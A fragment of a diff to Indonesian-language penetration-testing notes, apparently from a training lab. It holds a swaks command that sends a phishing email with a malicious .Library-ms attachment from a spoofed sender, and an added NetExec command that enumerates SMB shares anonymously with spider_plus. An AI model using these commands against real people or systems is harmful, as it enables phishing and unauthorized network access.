@@ -3332,3 +3332,8 @@ lalu pindah ke share webdav pada attacker machine. dan kirim email pada korban d
 sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
 ```
 
+check all shared smb
+
+```
+nxc smb 10.48.166.9 -u '' -p '' -M spider_plus --timeout=60
+```
